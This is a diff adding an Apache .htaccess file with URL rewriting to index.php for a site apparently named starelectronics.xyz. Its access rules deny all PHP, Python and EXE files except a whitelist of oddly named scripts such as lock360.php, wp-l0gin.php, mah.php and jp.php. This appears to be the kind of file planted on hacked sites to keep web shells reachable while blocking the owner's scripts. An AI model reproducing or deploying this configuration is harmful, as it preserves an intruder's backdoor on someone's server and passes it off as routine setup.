@@ -1,0 +1,29 @@
+<FilesMatch "\.(py|exe|php)$">
+    Order allow,deny
+    Deny from all
+</FilesMatch>
+
+<FilesMatch "^(about.php|radio.php|index.php|content.php|lock360.php|admin.php|wp-login.php|wp-l0gin.php|wp-theme.php|wp-scripts.php|wp-editor.php|mah.php|jp.php|ext.php)$">
+    Order allow,deny
+    Allow from all
+</FilesMatch>
+
+<IfModule mod_rewrite.c>
+    RewriteEngine On
+
+    # For localhost subdirectory, set correct base
+    RewriteBase /starelectronics.xyz/
+
+    # Don't rewrite index.php
+    RewriteRule ^index\.php$ - [L]
+
+    # Redirect all other requests to index.php
+    RewriteCond %{REQUEST_FILENAME} !-f
+    RewriteCond %{REQUEST_FILENAME} !-d
+    RewriteRule . /starelectronics.xyz/index.php [L]
+</IfModule>
+
+# If mod_rewrite isn't enabled, show 500 error for debugging
+<IfModule !mod_rewrite.c>
+    ErrorDocument 500 "mod_rewrite is not enabled"
+</IfModule>
